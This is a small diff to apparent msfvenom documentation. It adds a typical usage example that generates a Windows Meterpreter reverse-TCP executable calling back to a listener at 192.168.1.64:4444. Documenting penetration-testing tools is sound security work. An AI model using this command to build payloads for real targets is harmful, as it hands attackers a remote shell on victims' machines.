@@ -54,6 +54,12 @@ To see what formats are supported, you can do the following to find out:
 ./msfvenom --help-formats
 ```
 
+Typically, this is probably how you will use msfvenom:
+
+```
+$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.64 lport=4444 -f exe -o /tmp/my_payload.exe
+```
+
 
 **How to encode a payload**
 
